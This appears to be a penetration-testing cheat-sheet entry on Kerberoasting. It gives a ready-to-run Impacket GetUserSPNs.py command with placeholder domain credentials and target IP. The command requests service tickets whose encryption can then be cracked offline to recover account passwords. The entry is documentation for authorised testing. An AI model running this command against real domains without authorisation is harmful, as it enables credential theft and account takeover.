---
title: |
  Fetch Service Principal Names (SPNs) that are associated with user accounts
description: |
  Impacket's GetUserSPNs.py will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password, which can then be bruteforced offline.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: test

  	Password: Welkom01!

command: |
  python3 GetUserSPNs.py test.local/test:Welkom01! -request -dc-ip 10.10.10.1 -debug
items:
  - Password
  - Username
services:
  - Kerberos
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
---
